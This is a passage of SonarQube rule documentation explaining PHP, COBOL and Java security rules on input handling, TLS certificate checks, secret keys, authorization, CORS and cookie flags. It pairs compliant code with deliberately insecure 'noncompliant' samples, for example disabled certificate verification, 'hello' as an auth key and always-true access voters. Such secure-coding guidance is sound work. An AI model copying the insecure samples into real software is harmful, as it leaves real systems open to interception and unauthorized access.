<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2005-2337" rel="nofollow">CVE-2005-2337</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-11449" rel="nofollow">CVE-2017-11449</a> </li></ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> data read from the standard input is not sanitized before being used. </li></ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Sensitive Code Example</h2>
<pre>
// Any reference to STDIN is Sensitive
$varstdin &#61; STDIN; // Sensitive
stream_get_line(STDIN, 40); // Sensitive
stream_copy_to_stream(STDIN, STDOUT); // Sensitive
// ...


// Except those references as they can&#39;t create an injection vulnerability.
ftruncate(STDIN, 5); // OK
ftell(STDIN); // OK
feof(STDIN); // OK
fseek(STDIN, 5); // OK
fclose(STDIN); // OK


// STDIN can also be referenced like this
$mystdin &#61; &#39;php://stdin&#39;; // Sensitive

file_get_contents(&#39;php://stdin&#39;); // Sensitive
readfile(&#39;php://stdin&#39;); // Sensitive

$input &#61; fopen(&#39;php://stdin&#39;, &#39;r&#39;); // Sensitive
fclose($input); // OK
</pre>
<h2>See</h2>
<ul><li> <a href="https://cwe.mitre.org/data/definitions/20" rel="nofollow">MITRE, CWE-20</a> - Improper Input Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4823">
              php:S4823
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-7281" rel="nofollow">CVE-2018-7281</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12326" rel="nofollow">CVE-2018-12326</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2011-3198" rel="nofollow">CVE-2011-3198</a> </li></ul>
<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>
<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus
passing sensitive information via command line arguments should be considered as insecure.</p>
<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide
security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> any of the command line arguments are used without being sanitized first. </li><li> your application accepts sensitive information via command line arguments. </li></ul>
<p>If you answered yes to any of these questions you are at risk.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href="https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet" rel="nofollow">Sanitize</a> all command line arguments before using them.</p>
<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing
sensitive information to an application than exposing them in the command line. It is common to write them on the process&#39; standard input, or give the
path to a file containing the information.</p>
<h2>Sensitive Code Example</h2>
<p>Builtin access to <code>$argv</code></p>
<pre>
function globfunc() {
    global $argv; // Sensitive. Reference to global $argv
    foreach ($argv as $arg) { // Sensitive.
        // ...
    }
}

function myfunc($argv) {
    $param &#61; $argv[0]; // OK. Reference to local $argv parameter
    // ...
}

foreach ($argv as $arg) { // Sensitive. Reference to $argv.
    // ...
}

$myargv &#61; $_SERVER[&#39;argv&#39;]; // Sensitive. Equivalent to $argv.

function serve() {
    $myargv &#61; $_SERVER[&#39;argv&#39;]; // Sensitive.
    // ...
}

myfunc($argv); // Sensitive

$myvar &#61; $HTTP_SERVER_VARS[0]; // Sensitive. Note: HTTP_SERVER_VARS has ben removed since PHP 5.4.

$options &#61; getopt(&#39;a:b:&#39;); // Sensitive. Parsing arguments.

$GLOBALS[&#34;argv&#34;]; // Sensitive. Equivalent to $argv.

function myglobals() {
    $GLOBALS[&#34;argv&#34;]; // Sensitive
}

$argv &#61; [1,2,3]; // Sensitive. It is a bad idea to override argv.
</pre>
<p>Zend Console</p>
<pre>
new Zend\Console\Getopt([&#39;myopt|m&#39; &#61;&gt; &#39;this is an option&#39;]); // Sensitive
</pre>
<p>Getopt-php library</p>
<pre>
new \GetOpt\Option(&#39;m&#39;, &#39;myoption&#39;, \GetOpt\GetOpt::REQUIRED_ARGUMENT); // Sensitive
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li><li> <a href="https://cwe.mitre.org/data/definitions/88" rel="nofollow">MITRE, CWE-88</a> - Argument Injection or Modification </li><li> <a href="https://cwe.mitre.org/data/definitions/214" rel="nofollow">MITRE, CWE-214</a> - Information Exposure Through Process Environment </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4830">
              php:S4830
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>
<h2>Why is this an issue?</h2>
<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. The role
of certificate validation in this process is to ensure that a system is indeed the one it claims to be, adding an extra layer of trust and
security.</p>
<p>When certificate validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted
entity and intercept, manipulate, or steal the data being transmitted.</p>
<h3>What is the potential impact?</h3>
<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to
build this trust in internet communication, opening your system up to a number of potential threats.</p>
<h4>Identity spoofing</h4>
<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can
exploit this by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s
server, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect
any data your system sends to them, potentially leading to significant data breaches.</p>
<h4>Loss of data integrity</h4>
<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data
in transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious
code or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the
system.</p>
<h2>How to fix it in cURL</h2>
<h3>Code examples</h3>
<p>The following code contains examples of disabled certificate validation.</p>
<p>The certificate validation gets disabled by setting <code>CURLOPT_SSL_VERIFYPEER</code> to <code>false</code>. To enable validation set the value
to <code>true</code> or do not set <code>CURLOPT_SSL_VERIFYPEER</code> at all to use the secure default value.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
$curl &#61; curl_init();
curl_setopt($curl, CURLOPT_URL, &#39;https://example.com/&#39;);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Noncompliant
curl_exec($curl);
curl_close($curl);
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
$curl &#61; curl_init();
curl_setopt($curl, CURLOPT_URL, &#39;https://example.com/&#39;);
curl_exec($curl);
curl_close($curl);
</pre>
<h3>How does this work?</h3>
<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>
<p>To avoid running into problems with invalid certificates, consider the following sections.</p>
<h4>Using trusted certificates</h4>
<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list
of trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no
additional code or configuration.</p>
<h4>Working with self-signed certificates or non-standard CAs</h4>
<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted
roots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://cwe.mitre.org/data/definitions/295" rel="nofollow">MITRE, CWE-295</a> - Improper Certificate Validation </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S6339">
              php:S6339
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Secret keys are used in combination with an algorithm to encrypt data. A typical use case is an authentication system. For such a system to be
secure, the secret key should have a value which cannot be guessed and which is long enough to not be vulnerable to brute-force attacks.</p>
<p>A &#34;salt&#34; is an extra piece of data which is included when hashing data such as a password. Its value should have the same properties as a secret
key.</p>
<p>This rule raises an issue when it detects that a secret key or a salt has a predictable value or that it’s not long enough.</p>
<h3>Noncompliant code example</h3>
<p>WordPress:</p>
<pre>
define(&#39;AUTH_KEY&#39;, &#39;hello&#39;); // Noncompliant
define(&#39;AUTH_SALT&#39;, &#39;hello&#39;); // Noncompliant
define(&#39;AUTH_KEY&#39;, &#39;put your unique phrase here&#39;); // Noncompliant, this is the default value
</pre>
<h3>Compliant solution</h3>
<p>WordPress:</p>
<pre>
define(&#39;AUTH_KEY&#39;, &#39;D&amp;ovlU#|CvJ##uNq}bel&#43;^MFtT&amp;.b9{UvR]g%ixsXhGlRJ7q!h}XWdEC[BOKXssj&#39;);
define(&#39;AUTH_SALT&#39;, &#39;FIsAsXJKL5ZlQo)iD-pt??eUbdc{_Cn&lt;4!d~yqz))&amp;B D?AwK%)&#43;)F2aNwI|siOe&#39;);
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://wordpress.org/support/article/editing-wp-config-php/#security-keys" rel="nofollow">wordpress.org</a> - WordPress Security Keys </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5808">
              php:S5808
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Authorizations granted or not to users to access resources of an application should be based on strong decisions. For instance, checking whether
the user is authenticated or not, has the right roles/privileges. It may also depend on the user’s location, or the date, time when the user requests
access.</p>
<h3>Noncompliant code example</h3>
<p>In a Symfony web application:</p>
<ul><li> the <code>vote</code> method of a <a href="https://symfony.com/doc/current/security/voters.html" rel="nofollow">VoterInterface</a> type is not compliant when
  it returns only an affirmative decision (<code>ACCESS_GRANTED</code>): </li></ul>
<pre>
class NoncompliantVoterInterface implements VoterInterface
{
    public function vote(TokenInterface $token, $subject, array $attributes)
    {
        return self::ACCESS_GRANTED; // Noncompliant
    }
}
</pre>
<ul><li> the <code>voteOnAttribute</code> method of a <a href="https://symfony.com/doc/current/security/voters.html" rel="nofollow">Voter</a> type is not compliant
  when it returns only an affirmative decision (<code>true</code>): </li></ul>
<pre>
class NoncompliantVoter extends Voter
{
    protected function supports(string $attribute, $subject)
    {
        return true;
    }

    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)
    {
        return true; // Noncompliant
    }
}
</pre>
<p>In a Laravel web application:</p>
<ul><li> the <code>define</code>, <code>before</code>, and <code>after</code> methods of a <a href="https://laravel.com/docs/8.x/authorization" rel="nofollow">Gate</a>
  are not compliant when they return only an affirmative decision (<code>true</code> or <code>Response::allow()</code>): </li></ul>
<pre>
class NoncompliantGuard
{
    public function boot()
    {
        Gate::define(&#39;xxx&#39;, function ($user) {
            return true; // Noncompliant
        });

        Gate::define(&#39;xxx&#39;, function ($user) {
            return Response::allow(); // Noncompliant
        });
    }
}
</pre>
<h3>Compliant solution</h3>
<p>In a Symfony web application:</p>
<ul><li> the <code>vote</code> method of a <a href="https://symfony.com/doc/current/security/voters.html" rel="nofollow">VoterInterface</a> type should return a
  negative decision (<code>ACCESS_DENIED</code>) or abstain from making a decision (<code>ACCESS_ABSTAIN</code>): </li></ul>
<pre>
class CompliantVoterInterface implements VoterInterface
{
    public function vote(TokenInterface $token, $subject, array $attributes)
    {
        if (foo()) {
            return self::ACCESS_GRANTED; // Compliant
        } else if (bar()) {
            return self::ACCESS_ABSTAIN;
        }
        return self::ACCESS_DENIED;
    }
}
</pre>
<ul><li> the <code>voteOnAttribute</code> method of a <a href="https://symfony.com/doc/current/security/voters.html" rel="nofollow">Voter</a> type should return a
  negative decision (<code>false</code>): </li></ul>
<pre>
class CompliantVoter extends Voter
{
    protected function supports(string $attribute, $subject)
    {
        return true;
    }

    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)
    {
        if (foo()) {
            return true; // Compliant
        }
        return false;
    }
}
</pre>
<p>In a Laravel web application:</p>
<ul><li> the <code>define</code>, <code>before</code>, and <code>after</code> methods of a <a href="https://laravel.com/docs/8.x/authorization" rel="nofollow">Gate</a>
  should return a negative decision (<code>false</code> or <code>Response::deny()</code>) or abstain from making a decision (<code>null</code>): </li></ul>
<pre>
class NoncompliantGuard
{
    public function boot()
    {
        Gate::define(&#39;xxx&#39;, function ($user) {
            if (foo()) {
                return true; // Compliant
            }
            return false;
        });

        Gate::define(&#39;xxx&#39;, function ($user) {
            if (foo()) {
                return Response::allow(); // Compliant
            }
            return Response::deny();
        });
    }
}
</pre>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/285" rel="nofollow">MITRE, CWE-285</a> - Improper Authorization </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S4834">
              php:S4834
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>The access control of an application must be properly implemented in order to restrict access to resources to authorized entities otherwise this
could lead to vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-12999" rel="nofollow">CVE-2018-12999</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-10285" rel="nofollow">CVE-2018-10285</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-7455" rel="nofollow">CVE-2017-7455</a> </li></ul>
<p>Granting correct permissions to users, applications, groups or roles and defining required permissions that allow access to a resource is
sensitive, must therefore be done with care. For instance, it is obvious that only users with administrator privilege should be authorized to
add/remove the administrator permission of another user.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li><li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval
  …​). </li><li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>At minimum, an access control system should:</p>
<ul><li> Use a well-defined access control model like <a href="https://en.wikipedia.org/wiki/Role-based_access_control" rel="nofollow">RBAC</a> or <a href="https://en.wikipedia.org/wiki/Access-control_list" rel="nofollow">ACL</a>. </li><li> Entities&#39; permissions should be reviewed regularly to remove permissions that are no longer needed. </li><li> Respect <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a> (&#34;<em>an entity has access
  only the information and resources that are necessary for its legitimate purpose</em>&#34;). </li></ul>
<h2>Sensitive Code Example</h2>
<p>CakePHP</p>
<pre>
use Cake\Auth\BaseAuthorize;
use Cake\Controller\Controller;

abstract class MyAuthorize extends BaseAuthorize { // Sensitive. Method extending Cake\Auth\BaseAuthorize.
    // ...
}

// Note that &#34;isAuthorized&#34; methods will only be detected in direct subclasses of Cake\Controller\Controller.
abstract class MyController extends Controller {
    public function isAuthorized($user) { // Sensitive. Method called isAuthorized in a Cake\Controller\Controller.
        return false;
    }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> <a href="https://cwe.mitre.org/data/definitions/276" rel="nofollow">MITRE, CWE-276</a> - Incorrect Default Permissions </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li><li> <a href="https://cwe.mitre.org/data/definitions/277" rel="nofollow">MITRE, CWE-277</a> - Insecure Inherited Permissions </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S5122">
              php:S5122
            </a>
          </td>
          <td>
            <details>
              <p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-0269" rel="nofollow">CVE-2018-0269</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2017-14460" rel="nofollow">CVE-2017-14460</a> </li></ul>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">Same origin policy</a> in browsers prevents, by default and for
security-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)
from its own. The requested target can append additional HTTP headers in response, called <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">CORS</a>, that act like directives for the browser and change the access control policy
/ relax the same origin policy.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li><li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li><li> Your access control policy is dynamically defined by a user-controlled input like <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin" rel="nofollow"><code>origin</code></a> header. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li><li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or
  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li></ul>
<h2>Sensitive Code Example</h2>
<p>PHP built-in header function:</p>
<pre>
header(&#34;Access-Control-Allow-Origin: *&#34;); // Sensitive
</pre>
<p>Laravel:</p>
<pre>
response()-&gt;header(&#39;Access-Control-Allow-Origin&#39;, &#34;*&#34;); // Sensitive
</pre>
<p>Symfony:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;

$response &#61; new Response(
    &#39;Content&#39;,
    Response::HTTP_OK,
    [&#39;Access-Control-Allow-Origin&#39; &#61;&gt; &#39;*&#39;] // Sensitive
);
$response-&gt;headers-&gt;set(&#39;Access-Control-Allow-Origin&#39;, &#39;*&#39;); // Sensitive
</pre>
<p>User-controlled origin:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;

$origin &#61; $request-&gt;headers-&gt;get(&#39;Origin&#39;);

$response-&gt;headers-&gt;set(&#39;Access-Control-Allow-Origin&#39;, $origin); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>PHP built-in header function:</p>
<pre>
header(&#34;Access-Control-Allow-Origin: $trusteddomain&#34;);
</pre>
<p>Laravel:</p>
<pre>
response()-&gt;header(&#39;Access-Control-Allow-Origin&#39;, $trusteddomain);
</pre>
<p>Symfony:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;

$response &#61; new Response(
    &#39;Content&#39;,
    Response::HTTP_OK,
    [&#39;Access-Control-Allow-Origin&#39; &#61;&gt; $trusteddomain]
);

$response-&gt;headers-&gt;set(&#39;Access-Control-Allow-Origin&#39;, $trusteddomain);
</pre>
<p>User-controlled origin validated with an allow-list:</p>
<pre>
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\HttpFoundation\Request;

$origin &#61; $request-&gt;headers-&gt;get(&#39;Origin&#39;);

if (in_array($origin, $trustedOrigins)) {
    $response-&gt;headers-&gt;set(&#39;Access-Control-Allow-Origin&#39;, $origin);
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS" rel="nofollow">developer.mozilla.org</a> - CORS </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">developer.mozilla.org</a> - Same origin policy </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing" rel="nofollow">OWASP HTML5 Security
  Cheat Sheet</a> - Cross Origin Resource Sharing </li><li> <a href="https://cwe.mitre.org/data/definitions/346" rel="nofollow">MITRE, CWE-346</a> - Origin Validation Error </li><li> <a href="https://cwe.mitre.org/data/definitions/942" rel="nofollow">MITRE, CWE-942</a> - Overly Permissive Cross-domain Whitelist </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=php:S2092">
              php:S2092
            </a>
          </td>
          <td>
            <details>
              <p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP
request and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li><li> it’s not sure that the website contains <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content" rel="nofollow">mixed content</a> or not
  (ie HTTPS everywhere or not) </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour
  when creating cookies. </li><li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li></ul>
<h2>Sensitive Code Example</h2>
<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>
<pre>
session.cookie_secure &#61; 0; // Sensitive: this security-sensitive session cookie is created with the secure flag set to false (cookie_secure &#61; 0)
</pre>
<p>Same thing in PHP code:</p>
<pre>
session_set_cookie_params($lifetime, $path, $domain, false);
// Sensitive: this security-sensitive session cookie is created with the secure flag (the fourth argument) set to _false_
</pre>
<p>If you create a custom security-sensitive cookie in your PHP code:</p>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain, false);  // Sensitive: a security-sensitive cookie is created with the secure flag  (the sixth argument) set to _false_
</pre>
<p>By default <a href="https://www.php.net/manual/en/function.setcookie.php" rel="nofollow"><code>setcookie</code></a> and <a href="https://www.php.net/manual/en/function.setrawcookie.php" rel="nofollow"><code>setrawcookie</code></a> functions set the sixth argument / <code>secure</code>
flag to <em>false:</em></p>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)
setrawcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)
</pre>
<h2>Compliant Solution</h2>
<pre>
session.cookie_secure &#61; 1; // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to cookie_secure property set to 1
</pre>
<pre>
session_set_cookie_params($lifetime, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the fouth argument) set to true
</pre>
<pre>
$value &#61; &#34;sensitive data&#34;;
setcookie($name, $value, $expire, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth  argument) set to true
setrawcookie($name, $value, $expire, $path, $domain, true);// Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth argument) set to true
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://cwe.mitre.org/data/definitions/315" rel="nofollow">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li><li> <a href="https://cwe.mitre.org/data/definitions/614" rel="nofollow">MITRE, CWE-614</a> - Sensitive Cookie in HTTPS Session Without &#39;Secure&#39; Attribute </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cobol:S3394">
              cobol:S3394
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>The <code>ACCEPT</code> keyword does no editing or error checking of the data it stores, therefore its use can be dangerous. For this reason,
<code>ACCEPT</code> should be avoided.</p>
<h3>Noncompliant code example</h3>
<pre>
 01 USER-INPUT PIC X(4).

  GET-USER-INPUT.
       MOVE &#39;N&#39; TO WS-NUMERIC.
       PERFORM UNTIL WS-NUMERIC &#61; &#39;Y&#39;
           DISPLAY &#39;ENTER YOUR 4 DIGIT RECORD NUMBER: &#39; NO ADVANCING
           ACCEPT USER-RECORD *&gt; Noncompliant
</pre>
<h3>Exceptions</h3>
<p>This rule ignores uses of <code>ACCEPT FROM</code> with date/time-related inputs.</p>
<h2>Resources</h2>
<ul><li> <a href="https://owasp.org/Top10/A03_2021-Injection/" rel="nofollow">OWASP Top 10 2021 Category A3</a> - Injection </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection" rel="nofollow">OWASP Top 10 2017 Category A1</a> - Injection </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javasecurity:S6547">
              javasecurity:S6547
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Environment variable injection occurs in an application when the application receives data from a user or a third-party service and, without
sanitizing it first, does the following:</p>
<ul><li> Creates an environment variable based on the external data. </li><li> Inserts the external data into certain sensitive environment variables, such as <code>PATH</code> or <code>LD_PRELOAD</code>.   <pre>
If an application uses environment variables that are vulnerable to injection, it is exposed
to a variety of attacks that aim to exploit supposedly safe environment variables, such as &#96;PATH&#96;.
</pre>   </li></ul>
<p>A user with malicious intent carefully performs actions aimed at modifying or adding environment variables to profit from it.</p>
<h3>What is the potential impact?</h3>
<p>When user-supplied values are used to manipulate environment variables, an attacker can supply carefully chosen values that cause the system to
behave unexpectedly.<br /> In some cases, the attacker can use this capability to execute arbitrary code on the server.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Application-specific attacks</h4>
<p>In this scenario, the attacker manages to inject an environment variable that is recognized and used by the remote system. For example, this could
